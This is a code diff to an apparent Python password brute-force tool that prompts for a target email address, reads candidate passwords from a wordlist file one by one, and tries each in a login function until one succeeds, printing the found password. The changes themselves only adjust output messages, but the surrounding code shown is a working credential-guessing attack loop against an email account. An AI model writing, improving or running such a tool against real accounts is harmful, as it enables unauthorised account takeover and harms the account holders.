@@ -51,8 +51,6 @@ def function(email,passw,i):
 		print('password is ',passw)
 		#open('d.html','w').write(r.text)
 		return True
-	else:
-		print(i,passw)
 	return False
 
 #payload=create_form()
@@ -62,10 +60,11 @@ i=0
 email=input('Enter Email : ')
 print("")
 print("Target Email ID : ",email)
+print("")
 while file:
 	passw=file.readline().strip()
 	i+=1
-	print("Trying Password: ",i,passw)
+	print("Trying Password " + str(i) +": ",passw)
 	if function(email,passw,i):
 		break
 	# threading.Thread(target=function,args=(email,passw,i)).start()
